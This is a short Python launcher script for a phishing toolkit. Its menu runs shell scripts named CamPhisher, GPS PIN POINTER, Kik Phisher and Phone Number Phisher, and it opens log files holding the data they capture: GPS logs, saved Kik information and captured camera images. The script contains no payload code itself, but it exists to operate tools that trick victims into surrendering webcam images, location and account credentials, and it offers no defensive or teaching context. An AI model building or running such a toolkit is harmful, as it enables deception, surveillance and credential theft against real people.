import os

def main():
    print("Choose an option:")
    print("1. CamPhisher")
    print("2. GPS PIN POINTER")
    print("3. Kik Phisher")
    print("4. Phone Number Phisher")
    print("-------------------")
    print("99. gps logs")
    print("100. Kik Phisher Saved Info")
    print("--------------------")
    print("To view camphish logs. type cd tools/phishers/imgs ")
    
    choice = input("Enter 1 or 2: ")
    
    try:
        if choice == '1':
            os.system("bash tools/phishers/camphish.sh")
        elif choice == '2':
            os.system("bash tools/phishers/gps.sh")

        elif choice == '3':
            os.system("bash tools/phishers/kikphish.sh")
        elif choice == '4':
            os.system("bash tools/phishers/phonenumber_phisher.sh")

        elif choice == '99':
            os.system("pico tools/phishers/logs.txt")

        elif choice == '100':
            os.system("pico tools/phishers/saved.txt")
      
      
        else:
            print("Invalid choice. Please run the script again.")
    except Exception as e:
        print(f"An error occurred: {e}")
        input("Press Enter to continue...")

if __name__ == "__main__":
    main()
